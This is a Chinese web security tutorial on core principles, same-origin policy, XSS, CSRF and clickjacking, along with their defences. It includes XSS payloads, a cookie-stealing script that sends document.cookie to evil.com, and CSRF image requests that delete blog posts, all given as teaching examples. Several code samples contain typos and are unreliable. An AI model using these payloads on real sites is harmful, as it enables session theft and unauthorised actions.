# web安全
## 揭秘web安全的本质
安全是什么？什么样的情况下会产生安全问题？我们要如何看待安全问题？只有搞明白了这些基本问题，才能明白一切防御技术的出发点，才能明白为何我们要这样做，要那样做。

我们不妨从现实世界入手。火车站，机场里，在乘客们开始正式旅程之前，都有必要的程序：安全检查。这种检查就是过滤有害的，危险的东西。通过这种检查，可以梳理未知的人或物，使其变得可信任。web安全也是如此，安全问题的本质是信任问题。

一切的安全的方案的基础，都是建立在信任关系上的。我们必须相信一些东西，必须有一些最基本的假设，安全方案才能得以建立；如果我们否定一切，安全方案就会如无源之水，无根之木，也无法完成。

## 安全三要素
在设计方案之前，要正确全面地看待安全问题。

要全面地认识安全问题，我们有很多种办法，但首先要理解安全问题的组成属性。前人通过无数次实践，最后将安全的属性总结为安全三要素，简称CIA

安全三要素是安全的基本组成元素，分别是**机密性(Confidentiality)**, **完整性(Integrity)**, **可用性(Avaliability)**。

**机密性**要求保护数据内容不能泄露，加密是实现机密性要求的常见手段。

**完整性**要求保护的内容是完整的，没有被篡改的。常见的保证一致性的技术手段是数字签名

**可用性**要求保护资源是"随需而得的"，假设一个停车场里有100个车位，在正常情况下，可以停100辆车。但是在某一天，有个坏人搬了100块大石头，把每个车位都占用了，停车场无法再提供正常的服务。在安全领域中这中攻击叫做拒绝服务攻击，简称Dos(Denial of service)。拒绝服务攻击破坏的是安全的可用性。

## Secure By Default原则
在设计安全方案时，最基本也是最重要的原则就是“secure By Default”。在做任何安全设计时，都要牢牢记住这个原则。一个方案设计得是否足够安全，与有没有应用这个原则有很大的关系。实际上， “secure By Default”原则，也可以归纳为白名单，黑名单思想。如果更多地使用白名单，那么系统就会变得更安全。

## 黑名单，白名单

比如，在制定防火墙的网络访问控制策略时，如果网站只提供web服务，那么正确的做法是只允许网站服务器的80和443端口对外提供服务，屏蔽除此之外的其他端口。这是一种“白名单”做法；如果使用“黑名单”，则可能出现问题。假设黑名单的策略是：不允许SSh端口对Internet开发，那么就要审记SSH的默认端口：22端口是否开发了Internet。但在实际工作过程中，经常会发现有的工程师为了偷懒或图方便，私自改变了SSH的监听端口，比如把SSH的端口从22改到了2222，从而绕过了安全策略。

又比如，在网站的生产环境服务器上，应该限制随意安装软件，而需要制定统一的软件版本规范。这个规范的制定，也可以选择白名单的思想来实现。按照白名单的思想，应该根据业务需求，列出一个允许使用的软件版本清单，在此清单外的软件则禁止使用。如果允许工程师在服务器上随意安装软件的话，则可能会因为安全部门不知道，不熟悉这些软件而导致一些漏洞，从而扩大攻击面。

在web安全中，对白名单思想的运用也比比皆是。比如应用处理用户提交的富文本时，考虑到XSS的问题，需要做安全检查。常见的XSS Filter一般是先对用户输入的HTML原文作HTML Parse, 解析成标签对象后，再针对标签匹配XSS的规则。这个规则列表就是一个黑白名单。如果选择黑名单思想，则这套规则里可能是禁用诸如```<script>```, ```<iframe>```等标签。但是黑名单可能会有遗漏，比如未来浏览器如果支持新的html标签，那么此标签可能就不在黑名单之中了。如果选择白名单的思想，就能避免种问题，在规则中，只允许用户输入诸如```<a>,<img>```等需要用到的标签。 

## 最小权限原则

**Secure By Default** 的另一层含义就是“最小权限原则”。最小权限原则也是安全设计的基本原则之一。最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效地减少系统，网络，应用数据库出错的机会。

**数据与代码分离原则**
另一个重要的安全原则是数据与代码分离原则。这一原则广泛适用于各种由于“注入”而引发的安全问题的场景。

实际上，缓冲区溢出，也可以认为是程序违背了这一原则的后果——程序在栈或者堆中，将用户数据当做代码执行，混淆了代码与数据的边界，从而导致安全问题的发生。

在web安全中，由“注入”引起的问题比比皆是，如XSS, SQL Injection,CRLF Injection, Xpath Injection等。此类问题均可以根据“数据与代码分离原则”设计出真正安全的解决方案，因为这个原则抓住了漏洞形成的本质原因。

以XSS为例，它产生的原因是HTML Injection 或 JavaScript Injection，如果一个页面的代码如下
```
<html>
  <head>test</head>
  <body>
    $var
  </body>
</html>

```
其中 $var 是用户能够控制的变量，那么对于这段代码来说:
```
<html>
  <head>test</head>
  <body>
  </body>
</html>

```
就是程序的代码执行段。

而
**$var**
就是程序的用户数据片段。如果把用户数据片段 **$var** 当成代码片段来解释、执行，就会引发安全问题。
比如，当$var的值是
```
<script  src=http://evil ></script>
```

时，用户数据就被注入到代码片段中。解析这段脚本并执行的过程，是由浏览器来完成的——浏览器将用户数据里的<script>标签当做代码来解释——这显然不是程序开发者的本意。
根据数据与代码分离原则，在这里应该对用户数据片段 $var 进行安全处理，可以使用过滤、编码等手段，把可能造成代码混淆的用户数据清理掉，具体到这个案例中，就是针对 <、> 等符号做处理。

有的朋友可能会问了：我这里就是要执行一个<script>标签，要弹出一段文字，比如：“你好！”，那怎么办呢？

在这种情况下，数据与代码的情况就发生了变化，根据数据与代码分离原则，我们就应该重写代码片段：

```
<html>
  <head>test</head>
  <body>
    <script>
      alert("$var1");
    </script>
  </body>
</html>
```
在这种情况下，<script>标签也变成了代码片段的一部分，用户数据只有 $var1 能够控制，从而杜绝了安全问题的发生。

## 同源策略

同源策略(Same Origin Policy)是一种约定，它是浏览器最核心也是最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能都可能会受到影响。可以说Web是构建在同源策略的基础之上的，浏览器只是针对同源策略的一种实现。
 很多时候浏览器实现的同源策略是隐形的，透明的，很多因为同源策略导致的问题并没有明显的出错提示，如果不熟悉同源策略，则可能一直都会想不明白问题的原因。
 
 浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前”dicument“读取或设置某些属性。
 
 需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript页面所在的域是什么。
 换言之，a.com通过以下代码：
 ```
 <script src="http://b.com/b.js"></script>
 ```
 加载来b.com上的b.js，但是b.js是运行在a.com页面中的，由此对于当前打开的页面(a.com页面)来说，b.js的origin就应该是a.com而非b.com。
 
 在浏览器中，<script>,<img>,<iframe>,<link>等标签都可以跨域加载资源，而不受同源策略的限制。这些“src”属性的标签每次加载时，实际上是由浏览器发起一次GET请求。不同于XMKHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读，写返回的内容。
 
 对于XMLHttpRequest来说，它可以访问来自同源对象的内容。比如下例：
 ```
 <html>
  <head>
    <script type="text/javascript">
      var xmlhttp;
      function loadXMLDoc(url)
      {
        xmlhttp=null;
        if (window.XMLHttpRequest)
        {// code for Firefox, Opera, IE7, etc.
          xmlhttp=new XMLHttpRequest();
        }
        else if (window.ActiveXObject)
        {// code for IE6, IE5
          xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
        }
        if (xmlhttp!=null)
        {
          xmlhttp.onreadystatechange=state_Change;
          xmlhttp.open("GET",url,true);
          xmlhttp.send(null);
        }
        else
        {
          alert("Your browser does not support XMLHTTP.");
        }
      }

      function state_Change()
      {
        if (xmlhttp.readyState==4)
        {// 4 = "loaded"
          if (xmlhttp.status==200)
          {// 200 = "OK"
            document.getElementById('T1').innerHTML=xmlhttp.responseText;
          }
          else
          {
            alert("Problem retrieving data:" + xmlhttp.statusText);
          }
        }
      }
    </script>
  </head>

  <body onload="loadXMLDoc('/example/xdom/test_xmlhttp.txt')">
    <div id="T1" style="border:1px solid black;height:40;width:300;padding:5"></div><br />
    <button onclick="loadXMLDoc('/example/xdom/test_xmlhttp2.txt')">Click</button>
  </body>

</html>

 ```
 
 但XMLHttpRequest受到同源策略但约束，不能跨域访问资源，在AJAX应用的开发中尤其要注意这一点
 
 ## 跨站脚本攻击(XSS)
 
 跨站脚本攻击，英文全称是Cross Site Script, 本来缩写是CSS，但是为了和层叠样式有所区别，所以在安全领域叫做“XSS”
 
 XSS攻击，通常是指黑客通过“HTML注入”篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这中攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史的原因，XSS这个名字却一直保留下来。
 
 那么，什么是XSS呢？看看下面的例子。
 
 假设一个页面把用户输入的参数直接输出到页面上：
 ```
 <?php
 $input = $_GET("param");
 echo "<div>".$input."</div>"
 ?>
 
 ```
 
 在正常情况下，用户向param提交的数据会展示到页面中，比如提交： 
 ```
 https://www.a.com/test.php?param="我是测试内容"
 ```
 这是正常情况
 
 但是如果提交一段HTML代码
 ```
 https://www.a.com/test.php?param=<script>
 alert(/xss/)
 </script>
 ```
 会发现，alert(/xss/)在当前页面执行了，这显然不是用户想看到的结果
 
 上面的这个例子，就是XSS的第一种类型： 反射型XSS.
 
 XSS根据效果的不同可以分成如下几类。
 
 **第一种类型：反射型XSS**
 
 反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型XSS”
 
 **第二种类型：存储型XSS**
 
存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。

比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意的脚本保存到服务器端，所以这种XSS攻击叫做”存储型XSS“。

第三种类型：DOM Based XSS 
实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，DOM Based XSS 从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别

通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS

看如下代码
```
<script>
    function test() {
        var str = document.grtElementById("test").value;
        document.getElementById("t").innerHTML = "<a href = '"+str+"'>testLinr</a>"
    }
    <div id="t"></div>
    <input type="text" id="text" value="">
    <input type="button" id="s" value="write" onclick="test()">
</script>
```
 在这里，“write”按钮的onclick事件调用了test() 函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据html写入到页面中，这就造成了DOM Based XSS
 
 构造如下数据
 ```
 'Onclick = alert(/xss/)' //
 ```
 输入后，页面代码就变成了：
 ```
 <a href='' onclick="alert(/xss/)">testLink</a>
 ```
 
首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符“//”注释掉第二个单引号。

实际上，这里还有另外一种利用方式——除了构造一个新的事件外，还可以选择闭合掉<a>的标签，并插入一个新的HTML标签。尝试如下输入：
```
'><img src=# onerror=alert(/xss2/) /><'
```
页面代码变成
```
<a href=""><img src=# onerror=alert(/xss2/) /><'' >testLink</a>
```


**初探XSS Payload**

XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload”。
 
 XSS Payload实际上就是JavaScript脚本，所以任何JavaScript脚本能实现的功能，XSS PayLoad都能做到。
 
 一个最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。
 
 如下所示，攻击者先加载一个远程脚本
 ```
 http://www.a.com/test.htm?abc="><script
 src="http://www.evil.com/evil.js
 >
 
 </script>
 ```
 
 真正的XSS Payload写在一个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。
 
 在evil.js中，可以通过如下代码窃取Cookie:
 ```
 var img = doument.creatElement("img")
 img.src="http://www.evil.com/log?"+escape(document.cookie)
 document.body.appendChild(img)
 ```
 这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。
 
 ## 构造GET与POST
 一个网站的应用，只需要接受HTTP协议中的GET或POST请求，即可完成所有操作，对于攻击者来说，仅通过JavScript,就可以让浏览器发起这两种请求，比如删除博客的一篇文章。
 
 正常删除文章的链接是：
 http://********/manage/entry.do?m=delete&id=123
 
 对于攻击者来说，只需要知道文章的id,就能通过这个请求删除这篇文章了，本例文章id是123。
 
 攻击者可以通过插入一张照片来发起一个GET请求：
 ```
var img = document.createElement("img")
img.src= "http://*****/manage/entry.do?m=123"
document.body.appendChild(img)
 ```
 
 攻击者只需要让博客的作者执行这段JavaScript代码，就会把这篇文章删除。
 
 ## XSS的防御
 
 
 XSS的防御是复杂的，流行的浏览器都内置来一些对抗XSS的措施，比如Firefox的CSP, Noscript扩展，IE8内置的XSS Filter等。而对于网站来说，也应该寻找优秀的解决方案，保护用户不被XSS攻击。
 
 **HttpOnly**
 
 HttpOnly最早是由微软提出，浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie.
 
 HttpOnly的使用非常灵活。如下是一个使用HttpOnly的过程
 ```
 <?php
 header("set-Cookie": cookie1=test1);
 header("set-Cookie": cookie2=test2;httponly",false)
 
 ?>
 <script>
 alert(document.cookie);
 </script>
 ```
 
  虽然保存来两个cookie,但是只有cookie1被javaScript取到来。httponly起到来应有的作用。
  
  
 **输入检查**
 
 常见的Web漏洞如：Xss, SQL Inject等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。
 
 在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如： <,>,等，如果发现存在特殊字符，则将这些字符过滤或者编码。
 
 
 **安全的编码函数**
 编码分为很多种，针对HTML代码的编码方式是HTMLEncode.
 HTMLEncode并非专用名次，它只是一种函数实现。它的作用是将字符串转换成HTMLEntities,对应的标准是ISO-8859-1
 
 为了对抗XSS,在HtmlEncode中要求至少转换以下字符
 
 & --> &amp
 
 < --> &It
 
 
 ## 跨站点请求伪造(CSRF)
 
 在上面我们介绍过使用XSS Payload，只需要请求这个url,就能够把编号为“123”的博客文章删除。
 ```
 http://*****/manage/entry.do?m=deldted&id=123
 ```
 
 这个URL同时还存在CSRF漏洞。我们将尝试利用CSRF漏洞，删除编号为“123”的博客文章。这边文章的标题是"test1"
 
 攻击者首先在自己的域构造一个页面
 ```
 http://www.a.com/csrf.html
 ```
 其内容为
 
```
<img src="http://blog.sohu.com/manage/entry.do?m=delete&id=123"
```

使用了一个<img>标签，其地址指向了删除博客文章的链接。
攻击者诱使目标用户，访问这个页面。


##  CSRF的防御

CSRF攻击是一种比较奇特的攻击，下面看看有什么办法可以防御这种攻击。

**验证码**

验证码被认为是对抗CSRF攻击最简单而有效的防御方法。

CSRF攻击的过程，往往是在用户不知情的情况下构造网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。

但验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为主要的解决方案。

**Referer Check**


Referer Check在互联网中最常见的应用就是“防止图片盗链”。 同理，Referer Check也可以被用于检查请求是否来自合法的“源”

常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。

比如一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在页面。如果referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。

即使我们能够检查Referer是否合法来判断用户是否被CSRF攻击，也仅仅是满足了防御的充分条件。Referer Check的缺陷在于，服务器并非什么时候都能取到Referer。很多用户出于隐私保护的考虑，限制Referer的发送。在某些情况下，浏览器也不会发送Refer,比如从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。

在Flash的一些版本中，曾经可以发送自定义的Referer头。虽然Flash在新版本中已经加强了安全限制，不再允许发送自定义的Referer头，但是难免不会有别的客户端插件允许这中操作。

出于以上种种原因，我们还是无法依赖于Referer Check作为防御CSRF的主要手段。但是通过Referer Check来监控CSRF攻击的发生，倒是一种可行方法。

**CSRF的本质**

CSRF为什么能够攻击成功？其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。

攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造请求，反之，攻击者将无法攻击成功。

出于这个原因，可以想到一个解决方案：把参数加密，或者使用一些随机数，从而让攻击者无法猜测到参数。这是“不可预测性原则”的一种应用。

比如，一个删除操作的URL是：
```
http://****/delete?username=abc&item=123
```

把其中的username参数改成哈希值：

```
http://****/delete?username=md5(salt+abc)&item=123
```
这样，在攻击者不知道salt的情况下，是无法构造出这个url的，因此也就无从发起CSRF攻击来。而对于服务器来说，则可以从session或cookie中取得“username=abc”的值，再结合salt对整个请求进行验证，正常请求会被认为是合法的。

但是这个方法也存在一些问题。首先，加密或者混淆后的URL将变得非常难读，对于用户非常不友好。其次，如果加密的参数每次都改变，则某些URL将无法再被用户收藏。最后，普通的参数如果也被加密或者哈希，将会给数据分析工作带来很大的困扰，因为数据分析工作常常需要用到参数明文。

因此，我们需要一个更加通用的解决方案来帮助解决这个问题。这个方案就是使用Anti CSRF TOken。

回到上面的URL中，保持原参数不变，新增一个参数Token。这个Token的值是随机的，不可预测：
```
http://****/delete?username=abc&item=123$toktn=[random(seed)]
```

Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器。Token应该作为一个“秘密”，为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的session中，或者浏览器的cookie中。

由于Token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。

**点击劫持**

点击劫持是一种视觉上的欺骗手段，攻击者使用一个透明的，不可见的Ifram，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的Ifram页面。通过调整Ifram页面的位置，可以诱使用户恰好点击在ifram页面的一些功能性按钮上。

**图片覆盖攻击**

点击劫持的本质是一种视觉欺骗。顺着这个思路，还有一些攻击方法也可以起到类似的作用，比如图片覆盖。

一名叫sven.vetsch的安全研究者最先提出这种Cross Site Image Overlaying攻击，简称XSIO。sven.vetsch通过调整图片的style使得图片能够覆盖在他所指定的任意位置。

```
<a href="http://disenchant.ch">
<img src="http://disenchant.ch/powered.jpg" 
style=position:absolute;right;320px;top:90px

/>
```

点击此图片的话，会被链接到其他网站。

